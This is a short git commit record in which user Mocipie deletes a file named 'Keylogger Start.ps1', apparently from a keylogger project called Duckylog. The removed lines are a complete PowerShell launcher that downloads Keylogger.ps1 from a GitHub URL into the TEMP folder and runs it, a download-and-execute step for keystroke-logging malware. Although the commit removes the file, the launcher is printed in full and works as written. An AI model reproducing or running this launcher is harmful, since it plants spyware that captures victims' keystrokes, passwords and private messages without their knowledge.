251d5d74f8e15bf691dbf8fc11e4eb0e59271811
Mocipie <71799251+Mocipie@users.noreply.github.com>
2024-08-16 21:28:47 -0400

    Delete Keylogger Start.ps1

--- Keylogger Start.ps1
+++
@@ -1,4 +0,0 @@
-$scriptUrl = "https://raw.githubusercontent.com/Mocipie/Duckylog/main/Keylogger.ps1"
-$localScriptPath = "$env:TEMP\keylogger.ps1"
-Invoke-WebRequest -Uri $scriptUrl -OutFile $localScriptPath
-& $localScriptPath
